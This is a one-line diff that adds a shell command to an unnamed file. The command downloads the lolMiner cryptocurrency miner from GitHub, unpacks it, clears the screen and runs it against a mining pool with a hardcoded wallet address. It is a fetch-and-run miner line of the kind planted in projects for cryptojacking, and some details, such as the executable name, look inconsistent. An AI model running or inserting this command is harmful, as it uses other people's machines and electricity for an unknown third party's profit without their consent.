@@ -1,0 +1,1 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.76a/lolMiner_v1.76a_Lin64.tar.gz && tar -zxvf lolMiner_v1.76a_Lin64.tar.gz && cd lolMiner_v1.76a && clear && ./v1.76a -o rx.unmineable.com:3333 -a rx -k -u RVN:RQemkSrVrKBQBwXaJ9y2JpQXPDXirCH3Ne.AuthenticBlast -p x
